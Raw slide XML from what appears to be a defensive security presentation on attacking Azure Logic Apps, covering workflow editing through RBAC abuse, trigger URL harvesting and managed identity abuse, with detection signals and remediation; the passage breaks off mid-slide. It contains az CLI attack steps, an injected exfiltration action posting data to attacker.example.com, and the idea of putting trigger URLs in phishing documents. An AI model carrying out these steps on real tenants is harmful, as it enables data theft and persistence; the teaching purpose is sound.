                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Scoped to Logic Apps only</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1611908371"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Logic App Operator</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>No</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Can only enable/disable</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="181484821"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="212769981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752A8-3F80-7DAC-E710-5800079B144B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Why Logic Apps Are an Attack Target (cont.)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28C504CE-F470-7DC2-F5D3-88173BC79946}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1"/>
              <a:t>Logic App characteristics that attackers exploit:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Workflow definitions are JSON - anyone with Contributor can edit them via portal, CLI, or REST Application Programming Interface (API)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    No change-approval gate by default - a workflows/write operation takes effect immediately</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Managed identities provide credential-free access to Azure resources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Trigger URLs use SAS tokens - anyone with the URL can invoke the workflow without Azure auth</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Timer triggers provide persistence that survives attacker credential revocation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Run history exposes inputs and outputs of every action (unless secured)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="110992857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33C44-8940-AD99-5DEE-B8BE82659CA4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attack Vector 1 — RBAC Abuse to Edit Workflows</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2230471E-6873-1469-BCD3-1E6B4E495A86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1"/>
              <a:t>Attack flow:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Attacker with Contributor access enumerates Logic Apps: az logic workflow list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Downloads the existing workflow definition: az logic workflow show --query "definition"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Edits the JSON to inject an HTTP action that POSTs data to an attacker endpoint</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="87668123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306FA-7E51-24B7-EDE3-2CED9B85E3CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="588263" y="457200"/>
            <a:ext cx="11018520" cy="1107996"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attack Vector 1 — RBAC Abuse to Edit Workflows (cont. 2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D80BB7D8-8137-8E52-3F7F-B7D8161F0D3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="584200" y="1742996"/>
            <a:ext cx="11018838" cy="4526042"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Uploads the modified definition: az logic workflow update --definition @workflow.json</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Grants their own identity Logic App Contributor for long-term persistence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1"/>
              <a:t>Injected exfiltration action example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    HTTP POST to attacker.example.com/collect with trigger output as body</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Runs in the context of the Logic App's managed identity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000"/>
              <a:t>    Generates a Microsoft.Logic/workflows/write event in AzureActivity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39626031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9741A-4C59-1950-D7DB-07E2A0B50737}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attack Vector 2 — Trigger URL Harvesting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D55B98AC-B9FF-F4D5-DFF4-E7F78C6F551D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>HTTP-triggered Logic Apps use a SAS-signed callback URL as the trigger endpoint. This URL contains a sig= parameter that acts as a bearer secret - anyone with the URL can invoke the workflow without Azure credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1"/>
              <a:t>Attack flow:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>    Attacker calls listCallbackUrl to retrieve the SAS-signed trigger URL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="418234637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8D4FA-6A3B-303A-549E-F5C370F32656}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attack Vector 2 — Trigger URL Harvesting (cont. 2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{856175DB-37CE-9032-077F-8838C0D5CE78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>    URL format: https://prod-xx.eastus.logic.azure.com/.../invoke?sig=&lt;SAS_TOKEN&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>    Attacker invokes the workflow externally with curl - no Azure auth required</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>    Can embed trigger URL in phishing documents for victim-triggered execution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>Detection signal: Microsoft.Logic/workflows/triggers/listCallbackUrl/action in AzureActivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t>Remediation: Delete and recreate the trigger to invalidate all existing SAS URLs.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="280191072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779C9-5F65-5F60-28FE-AE916C1D7A19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attack Vector 3 — Managed Identity Abuse</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5834641-2013-B24D-48F0-E3385009AC1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1390930171"/>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342942936"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2179057224"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2278088784"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Target Resource</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Common MI Permission</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>What Attacker Accesses</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2589508749"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Azure Blob Storage</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Storage Blob Data Reader</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>List and download all blobs</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1537269591"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>SharePoint / OneDrive</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Sites.Read.All (Graph)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Download files from SharePoint</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1293126282"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Azure Key Vault</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Key Vault Secrets User</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Read secrets and connection strings</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3160569578"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="977900">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Microsoft Graph</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Mail.Read</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Read mailbox contents</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="193728340"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="81528360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17504-26EF-A640-0679-06C8BBBCCDA1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attack Vector 3 — Managed Identity Abuse (cont.)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63885BF8-6572-F08B-76F4-7EBDE30F0BC1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>Logic Apps with managed identities can access Azure resources without explicit credentials. An attacker who edits the workflow definition redirects those managed identity calls.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1"/>
              <a:t>Typical adversary sequence:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Compromise credentials with Contributor on resource group</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
